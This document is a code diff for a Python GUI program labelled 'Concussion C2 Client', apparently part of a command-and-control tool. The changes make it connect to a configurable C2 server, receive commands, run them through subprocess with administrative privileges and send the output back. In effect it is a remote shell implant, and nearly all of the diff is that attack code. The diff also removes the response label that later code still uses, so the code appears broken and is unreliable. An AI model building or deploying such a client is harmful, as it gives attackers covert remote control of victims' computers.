@@ -12,24 +12,42 @@ root.geometry("700x500")
 root.configure(bg="#000046")
 
 # Create a socket for the client
-client_socket = None  # Initialize the client socket
+client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Initialize the client socket
+
+# Define the server's IP address and port
+SERVER_IP = '127.0.0.1'  # Replace with the actual IP address of your C2 server
+SERVER_PORT = 2222  # Replace with the actual port your server is listening on
+
+error_message = None  # Initialize the error message variable
+
+try:
+    print("Attempting to connect to the server...")
+    client_socket.connect((SERVER_IP, SERVER_PORT))
+    print("Connected to the server successfully.")
+except Exception as e:
+    error_message = f"Connection Error: {e}"
+    print(f"Error connecting to the server: {e}")
+
+# Define and initialize the status label
+status_label = tk.Label(root, text="Connection Status: Connecting...", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
+status_label.pack(padx=10, pady=10)
 
 # Function to update the response label
 def update_response(message):
+    if error_message:
+        message = error_message  # If an error occurred, display it
     response_label.config(text=message)
 
-# Function to handle commands from the server
+# Function to handle commands from the server (unchanged)
 def handle_command(command):
     try:
         result = execute_command(command)
         update_response(result)
-
-        # Send the result back to the server
         send_response_to_server(result)
-
     except Exception as e:
         update_response(f"Error: {e}")
 
+# Function to execute commands
 def execute_command(command):
     try:
         # Use subprocess to run the command with administrative privileges
@@ -45,6 +63,7 @@ def execute_command(command):
     except Exception as e:
         return f"Error: {e}"
 
+# Function to send responses to the server
 def send_response_to_server(response):
     try:
         if client_socket is not None:
@@ -54,31 +73,24 @@ def send_response_to_server(response):
     except Exception as e:
         update_response(f"Error sending response to server: {e}")
 
-# Function to listen for commands from the server
+# Start listening for commands in a separate thread
 def listen_for_commands():
     try:
         while True:
             if client_socket is not None:
+                print("Waiting for a command from the server...")
                 command = client_socket.recv(1024).decode('utf-8')
                 if not command:
                     break
+                print(f"Received command from the server: {command}")
 
                 handle_command(command)
-
     except Exception as e:
+        print(f"Error during command listening: {e}")
         update_response(f"Error: {e}")
 
-# Labels and Heading (unchanged)
-main_heading = tk.Label(root, text="Concussion C2 Client", font=("Helvetica", 16, "bold"), bg="#000046", fg="#00C8FF")
-main_heading.pack(pady=(20, 10))
-
-status_label = tk.Label(root, text="Connection Status: Not Connected", font=("Helvetica", 16, "bold"), bg="#000046", fg="#41E67B")
-status_label.pack(padx=10, pady=10)
-
-response_label = tk.Label(root, text="", font=("Helvetica", 14), bg="#000046", fg="#00C8FF")
-response_label.pack(padx=10, pady=10)
-
-# Start listening for commands in a separate thread
+# Print a message when starting to listen for commands
+print("Starting to listen for commands from the server...")
 command_listener_thread = threading.Thread(target=listen_for_commands)
 command_listener_thread.start()
 
